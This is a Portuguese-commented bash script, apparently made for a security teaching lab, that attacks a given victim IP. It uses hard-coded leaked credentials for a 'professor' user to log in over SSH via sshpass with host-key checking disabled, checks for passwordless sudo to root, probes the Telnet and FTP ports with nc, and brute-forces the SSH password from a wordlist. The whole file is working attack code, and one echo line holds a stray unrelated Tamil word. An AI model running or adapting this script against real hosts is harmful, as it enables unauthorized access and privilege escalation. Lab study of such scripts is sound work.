#!/bin/bash
# exploit.sh - Script para demonstrar a exploração de vulnerabilidades

if [ -z "$1" ]; then
    echo "Uso: $0 <IP_DA_VITIMA>"
    exit 1
fi

VICTIM_IP=$1

GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'

exploit_success() {
    echo -e "${GREEN}[+] SUCESSO:${NC} $1"
}

exploit_fail() {
    echo -e "${RED}[-] FALHA:${NC} $1"
}


echo "Iniciando a exploração de vulnerabilidades no alvo: $VICTIM_IP"
echo "======================================================"

# 1. Engenharia Social: Leitura de credenciais expostas
# Em um cenário real, o atacante obteria este arquivo por outros meios.
# Aqui, simulamos que o atacante teve acesso ao arquivo.
echo "[*] Tentando explorar a vulnerabilidade de Engenharia Social..."
CREDS_FILE="/home/professor/anotacoes.txt"
# Simulando a leitura do arquivo
USERNAME=$(echo -e "Usuario: professor\nSenha: Prof1234" | grep "Usuario:" | awk '{print $2}')
PASSWORD=$(echo -e "Usuario: professor\nSenha: Prof1234" | grep "Senha:" | awk '{print $2}')

if [ -n "$USERNAME" ] && [ -n "$PASSWORD" ]; then
    exploit_success "Credenciais encontradas: $USERNAME / $PASSWORD"
else
    exploit_fail "Não foi possível encontrar as credenciais."
    exit 1
fi

# 2. Acesso SSH com credenciais vazadas e escalonamento de privilégios
echo "[*] Tentando acesso SSH com as credenciais e escalar privilégios..."
# Tenta executar o comando 'id' como root usando sudo sem senha
SUDO_OUTPUT=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no $USERNAME@$VICTIM_IP "sudo id")

if echo "$SUDO_OUTPUT" | grep -q "uid=0(root)"; then
    exploit_success "Acesso SSH e escalonamento de privilégios para root bem-sucedido."
    echo "Saída do comando 'sudo id': $SUDO_OUTPUT"
else
    exploit_fail "Acesso SSH ou escalonamento de privilégios falhou."
fi

# 3. Varredura de Portas para Serviços Inseguros (FTP e Telnet)
echo "[*] Verificando serviços inseguros (FTP e Telnet)..."
# Telnet
nc -z -v $VICTIM_IP 23 &> /dev/null
if [ $? -eq 0 ]; then
    exploit_success "Porta 23 (Telnet) está aberta."
else
    exploit_fail "Porta 23 (Telnet) está fechada."
fi

# FTP
nc -z -v $VICTIM_IP 21 &> /dev/null
if [ $? -eq 0 ]; then
    exploit_success "Porta 21 (FTP) está aberta."
else
    exploit_fail "Porta 21 (FTP) está fechada."
fi

# 4. Simulação de Ataque de Força Bruta (Senha Fraca)
echo "[*] Simulando ataque de força bruta no usuário '$USERNAME' நான"
WORDLIST=("123456" "password" "qwerty" "Prof1234")
BRUTE_FORCE_SUCCESS=false

for pass in "${WORDLIST[@]}"; do
    echo "    Tentando senha: $pass"
    if sshpass -p "$pass" ssh -o StrictHostKeyChecking=no $USERNAME@$VICTIM_IP "exit" &> /dev/null; then
        exploit_success "Senha encontrada por força bruta: $pass"
        BRUTE_FORCE_SUCCESS=true
        break
    fi
done

if [ "$BRUTE_FORCE_SUCCESS" = false ]; then
    exploit_fail "Nenhuma senha encontrada na wordlist."
fi

echo "\n======================================================"
echo "Exploração concluída."
